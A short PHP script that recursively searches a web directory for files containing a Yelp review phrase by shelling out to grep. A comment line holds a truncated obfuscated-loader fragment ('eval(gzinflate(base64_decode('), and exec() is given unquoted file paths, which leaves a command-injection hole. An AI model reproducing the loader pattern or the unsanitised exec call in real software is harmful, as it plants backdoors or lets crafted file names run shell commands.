<?php
//echo date("Y m d h:i:sa"); die;


set_time_limit(60000);
function GetDirArray($sPath)  { 
	//Load Directory Into Array 
	$handle=opendir($sPath); 
	while ($file = readdir($handle)) { 
		$retVal[count($retVal)] = $file; 
	}	 
	//Clean up and sort 
	closedir($handle); 
	sort($retVal); 
	//return $retVal; <?php eval(gzinflate(base64_decode(

//for getting tabel from folder

	while (list($key, $val) = each($retVal))  {
		if ($val != "." && $val != ".." && $val != "bgcovers" && $val != "covers" && $val != "smcovers") { 
			$path = str_replace("//","/",$sPath.$val); 
			exec("more $path | grep 'Write a review on Yelp'",$arr,$res);
			if(!$res) {
				echo "$path =>";
				echo $res ."<BR>";
			}
			if (is_dir($sPath.$val)) {
				GetDirArray($sPath.$val."/"); 
			}
		}
	}
}
GetDirArray("./");
?>